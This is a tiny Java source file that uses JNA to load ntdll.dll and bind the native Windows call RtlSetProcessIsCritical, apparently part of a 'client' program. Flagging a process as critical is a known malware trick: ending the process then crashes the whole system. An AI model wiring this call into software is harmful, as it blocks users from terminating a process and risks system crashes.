package me.client.utils;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef;

public interface LoadNtdll extends Library {
    LoadNtdll instance= (LoadNtdll) Native.loadLibrary("ntdll.dll", LoadNtdll.class);
    void RtlSetProcessIsCritical(WinDef.BOOL b, Pointer p, WinDef.BOOL b1);
}
